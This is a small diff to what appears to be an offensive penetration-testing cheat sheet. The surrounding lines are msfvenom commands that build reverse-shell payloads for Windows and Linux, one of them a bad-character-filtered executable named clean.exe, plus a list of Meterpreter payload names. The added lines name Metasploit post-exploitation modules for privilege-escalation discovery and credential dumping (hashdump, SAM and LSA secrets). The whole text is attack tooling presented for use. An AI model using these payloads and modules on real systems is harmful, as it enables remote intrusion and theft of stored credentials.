@@ -159,6 +159,12 @@ msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f c
 msfvenom -p linux/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -f python
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=IP LPORT=PORT -b '\x00\x0a\x0d' -f exe -o clean.exe
 
+local_exploit_suggester
+hashdump
+lsa_dump_sam
+lsa_dump_secrets
+
+
 windows/x64/shell_reverse_tcp
 windows/x64/meterpreter/reverse_tcp
 windows/x64/meterpreter_reverse_tcp (stageless)
